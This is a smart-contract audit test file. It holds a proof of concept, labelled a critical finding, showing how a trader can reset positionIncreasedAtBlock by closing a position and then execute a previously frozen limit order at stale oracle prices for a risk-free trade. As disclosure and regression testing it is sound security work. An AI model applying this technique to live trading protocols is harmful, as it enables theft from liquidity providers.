import { expect } from "chai";
import { mine, time } from "@nomicfoundation/hardhat-network-helpers";
import { deployFixture } from "../../../utils/fixture";
import { expandDecimals, decimalToFloat } from "../../../utils/math";
import { getBalanceOf, getSyntheticTokenAddress, getSupplyOf } from "../../../utils/token";
import { getDepositCount, getDepositKeys, createDeposit, executeDeposit, handleDeposit } from "../../../utils/deposit";
import * as keys from "../../../utils/keys";
import { getAccountPositionCount, getPositionCount, getPositionKeys } from "../../../utils/position";
import {
  OrderType,
  getOrderCount,
  handleOrder,
  createOrder,
  executeOrder,
  getOrderKeys,
  DecreasePositionSwapType,
} from "../../../utils/order";
import { expectTokenBalanceIncrease } from "../../../utils/token";
import { grantRole } from "../../../utils/role";
import { executeLiquidation } from "../../../utils/liquidation";
import { ethers } from "hardhat";
import { TOKEN_ORACLE_TYPES } from "../../../utils/oracle";
import { BigNumber } from "ethers";
import { getIsAdlEnabled, updateAdlState, executeAdl } from "../../../utils/adl";
import { getPoolAmount, getMarketTokenPrice } from "../../../utils/market";
import { claimableCollateralAmountKey } from "../../../utils/keys";
import { createWithdrawal, executeWithdrawal, handleWithdrawal, getWithdrawalCount } from "../../../utils/withdrawal";
import { hashData, hashString, encodeData } from "../../../utils/hash";

describe("Guardian.GLOBAL-4", () => {
  const { provider } = ethers;

  let fixture;
  let user0, user1, user2, wallet;
  let reader,
    dataStore,
    oracle,
    depositVault,
    ethUsdMarket,
    ethUsdSpotOnlyMarket,
    wnt,
    usdc,
    exchangeRouter,
    orderHandler,
    referralStorage,
    orderVault,
    positionUtils,
    solAddr,
    positionStoreUtils,
    tokenUtils,
    wntAccurate,
    ethUsdAccurateMarket,
    marketUtils,
    solUsdMarket,
    config;
  let roleStore, decreasePositionUtils, executionFee, prices;
  let eventEmitter, adlUtils;

  beforeEach(async () => {
    fixture = await deployFixture();

    ({ wallet, user0, user1, user2 } = fixture.accounts);
    ({ executionFee, prices } = fixture.props);
    ({
      reader,
      dataStore,
      orderHandler,
      oracle,
      depositVault,
      ethUsdMarket,
      orderVault,
      ethUsdSpotOnlyMarket,
      tokenUtils,
      wnt,
      marketUtils,
      referralStorage,
      positionUtils,
      usdc,
      exchangeRouter,
      positionStoreUtils,
      roleStore,
      decreasePositionUtils,
      eventEmitter,
      wntAccurate,
      ethUsdAccurateMarket,
      solUsdMarket,
      config,
      adlUtils,
    } = fixture.contracts);

    await grantRole(roleStore, wallet.address, "LIQUIDATION_KEEPER");
    solAddr = getSyntheticTokenAddress("SOL");

    await handleDeposit(fixture, {
      create: {
        market: ethUsdMarket,
        longTokenAmount: expandDecimals(1000, 18),
        shortTokenAmount: expandDecimals(500 * 1000, 6),
      },
    });
  });

  it("CRITICAL: positionIncreasedAtBlock can be used to game limit orders", async () => {
    const initialWNTBal = expandDecimals(10, 18); // 10 ETH

    const increaseParams = {
      account: user1,
      market: ethUsdMarket,
      minOutputAmount: 0,
      initialCollateralToken: wnt,
      initialCollateralDeltaAmount: initialWNTBal,
      sizeDeltaUsd: decimalToFloat(50 * 1000),
      acceptablePrice: expandDecimals(5000, 12),
      triggerPrice: expandDecimals(5000, 12),
      orderType: OrderType.LimitIncrease,
      isLong: true,
      shouldUnwrapNativeToken: false,
    };

    // Trader opens a few limit orders so that one of them will not be able to get executed and remain in the store
    await createOrder(fixture, increaseParams);
    await createOrder(fixture, increaseParams);
    await createOrder(fixture, increaseParams);

    const [firstLimitOrderKey, secondLimitOrderKey, thirdLimitOrderKey] = await getOrderKeys(dataStore, 0, 3);

    expect(await getPositionCount(dataStore)).to.eq(0);

    // Price moves in the direction the trader wanted, the first limitIncrease is executed
    await mine(10);
    const validPriceOracleBlock = await provider.getBlock();
    const validPriceOracleBlockNumber = BigNumber.from(validPriceOracleBlock.number);

    await executeOrder(fixture, {
      key: firstLimitOrderKey,
      tokens: [wnt.address, wnt.address],
      minPrices: [expandDecimals(5010, 4), expandDecimals(4990, 4)],
      maxPrices: [expandDecimals(5010, 4), expandDecimals(4990, 4)],
      priceFeedTokens: [usdc.address],
      oracleBlockNumber: validPriceOracleBlockNumber,
      precisions: [8, 8],
    });

    expect(await getPositionCount(dataStore)).to.eq(1);

    let userPositions = await reader.getAccountPositions(dataStore.address, user1.address, 0, 5);
    expect(userPositions.length).to.eq(1);
    let userPosition = userPositions[0];

    expect(userPosition.numbers.sizeInUsd).to.eq(decimalToFloat(50 * 1000));
    expect(userPosition.numbers.sizeInTokens).to.eq(expandDecimals(10, 18));

    // Now the keeper cannot execute the other limit orders with the past prices
    // If it does so, the orders will get frozen due to OracleBlockNumbersAreSmallerThanRequired
    // The keeper could send X of these limitIncrease execution tx's before the first one is actually recorded in a block
    // and the keeper sees that now these block-ranges for prices are no longer valid & stops sending tx's to execute these orders.
    // In this case an attacker needs to simply create X + 1 orders so that at least one of them will remain in the store.
    await executeOrder(fixture, {
      key: secondLimitOrderKey,
      tokens: [wnt.address, wnt.address],
      minPrices: [expandDecimals(5010, 4), expandDecimals(4990, 4)],
      maxPrices: [expandDecimals(5010, 4), expandDecimals(4990, 4)],
      priceFeedTokens: [usdc.address],
      oracleBlockNumber: validPriceOracleBlockNumber,
      precisions: [8, 8],
    });

    const order = await reader.getOrder(dataStore.address, secondLimitOrderKey);
    expect(order.flags.isFrozen).to.be.true;

    expect(await getPositionCount(dataStore)).to.eq(1);

    userPositions = await reader.getAccountPositions(dataStore.address, user1.address, 0, 5);
    expect(userPositions.length).to.eq(1);
    userPosition = userPositions[0];

    expect(userPosition.numbers.sizeInUsd).to.eq(decimalToFloat(50 * 1000));
    expect(userPosition.numbers.sizeInTokens).to.eq(expandDecimals(10, 18));

    // Now time goes by and the price of ETH goes down to $4000
    // The trader decides they would like their order with the thirdLimitOrderKey to be
    // Executed at that outdated range including $5,000
    // So all the trader has to do is close their position with a decrease order
    // Setting the positionIncreasedAtBlock to 0 & making that outdated range valid again
    const decreaseParams = {
      account: user1,
      market: ethUsdMarket,
      minOutputAmount: 0,
      initialCollateralToken: wnt,
      initialCollateralDeltaAmount: initialWNTBal,
      sizeDeltaUsd: decimalToFloat(50 * 1000), // Close position
      acceptablePrice: expandDecimals(5000, 12),
      triggerPrice: expandDecimals(5000, 12),
      orderType: OrderType.MarketDecrease,
      isLong: true,
      shouldUnwrapNativeToken: false,
    };

    expect(await getOrderCount(dataStore)).to.eq(2);

    await createOrder(fixture, decreaseParams);

    expect(await getOrderCount(dataStore)).to.eq(3);

    const decreaseOrderKey = (await getOrderKeys(dataStore, 0, 4))[2];
    const decreaseOrder = await reader.getOrder(dataStore.address, decreaseOrderKey);

    expect(decreaseOrder.numbers.orderType).to.eq(OrderType.MarketDecrease);

    await executeOrder(fixture, {
      key: decreaseOrderKey,
      tokens: [wnt.address, usdc.address],
      prices: [expandDecimals(4000, 4), expandDecimals(1, 6)],
    });

    expect(await getPositionCount(dataStore)).to.eq(0);

    const thirdLimitOrder = await reader.getOrder(dataStore.address, thirdLimitOrderKey);

    expect(thirdLimitOrder.numbers.updatedAtBlock).to.lt(validPriceOracleBlockNumber);

    // Now the third limitIncrease with the thirdLimitOrderKey can be executed with these prices
    await executeOrder(fixture, {
      key: thirdLimitOrderKey,
      tokens: [wnt.address, wnt.address],
      minPrices: [expandDecimals(5010, 4), expandDecimals(4990, 4)],
      maxPrices: [expandDecimals(5010, 4), expandDecimals(4990, 4)],
      priceFeedTokens: [usdc.address],
      oracleBlockNumber: validPriceOracleBlockNumber,
      precisions: [8, 8],
    });

    // The attacker has just let a limitIncrease execute with old prices, enabling a risk-free trade
    expect(await getPositionCount(dataStore)).to.eq(1);

    userPositions = await reader.getAccountPositions(dataStore.address, user1.address, 0, 5);
    expect(userPositions.length).to.eq(1);
    userPosition = userPositions[0];

    expect(userPosition.numbers.sizeInUsd).to.eq(decimalToFloat(50 * 1000));
    expect(userPosition.numbers.sizeInTokens).to.eq(expandDecimals(10, 18));

    // This attack pertains to any limit order type, not just LimitIncrease, so there is not always a requirement to send some
    // tokens for collateral to create the order. This way the only financial constraint on creating ~(X + 1) orders
    // is the executionFee and tx gas fee, which can be inconsequential compared to the amount gained by a large risk-free trade
  });
});
